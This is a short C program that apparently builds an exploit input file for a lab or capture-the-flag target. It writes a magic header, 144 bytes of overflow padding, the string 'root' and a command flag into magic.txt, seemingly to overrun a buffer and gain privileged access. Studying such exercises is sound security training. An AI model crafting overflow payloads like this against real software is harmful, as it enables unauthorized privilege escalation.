#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#define MAGIC_HEADER 0x2752
#define CMD_FLAG 3

int main(){
    unsigned char payload[256] = {0}; 
    size_t i = 0;
    int fd = -1;
    
    *(uint16_t*)payload = MAGIC_HEADER;
    for(int j = 2; j < 146;j++){
        payload[j] = 0x84;
    }
    payload[146] = 'r';
    payload[147] = 'o';
    payload[148] = 'o';
    payload[149] = 't';
    payload[150] = CMD_FLAG;
    fd = open("magic.txt",O_WRONLY);
    if (fd == -1){
        printf("couldn't open up magic.txt for writing.\n");
        return -1;
    }
    write(fd,payload,sizeof(payload));
    close(fd);
    return 0;
}